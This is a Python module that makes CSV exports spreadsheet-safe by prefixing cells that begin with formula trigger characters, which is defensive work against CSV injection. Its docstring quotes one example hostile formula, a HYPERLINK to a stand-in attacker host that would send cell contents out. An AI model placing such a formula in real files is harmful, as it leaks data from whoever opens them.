"""Spreadsheet-safe CSV writing.

A cell that starts with ``=``, ``+``, ``-``, ``@`` (or a tab or carriage return) is a *formula* to Excel,
Google Sheets and LibreOffice — "CSV injection". Argus exports hold text that came from targets and from
the criminal ecosystem (DNS records, banners, profile names, leak-site victim names, dark-web page titles),
so a hostile value such as ``=HYPERLINK("https://evil.example/?"&A1,"Click")`` would run when an analyst
opens the export. Every CSV Argus writes goes through :func:`writer`, which prefixes such a cell with a
single quote so the spreadsheet shows it as text (the OWASP-recommended neutralisation).

Only text is touched: numbers (a negative score, say) are written as they are.
"""

from __future__ import annotations

import csv
from collections.abc import Iterable
from typing import IO, Any

TRIGGERS = ("=", "+", "-", "@", "\t", "\r")


def cell(value: Any) -> Any:
    """``value``, made inert if a spreadsheet would read it as a formula."""
    if isinstance(value, str) and value[:1] in TRIGGERS:
        return "'" + value
    return value


class SafeWriter:
    """A ``csv.writer`` that neutralises every cell."""

    def __init__(self, stream: IO[str], **kwargs: Any):
        self._writer = csv.writer(stream, **kwargs)

    def writerow(self, row: Iterable[Any]) -> Any:
        return self._writer.writerow([cell(v) for v in row])

    def writerows(self, rows: Iterable[Iterable[Any]]) -> None:
        for row in rows:
            self.writerow(row)


def writer(stream: IO[str], **kwargs: Any) -> SafeWriter:
    return SafeWriter(stream, **kwargs)
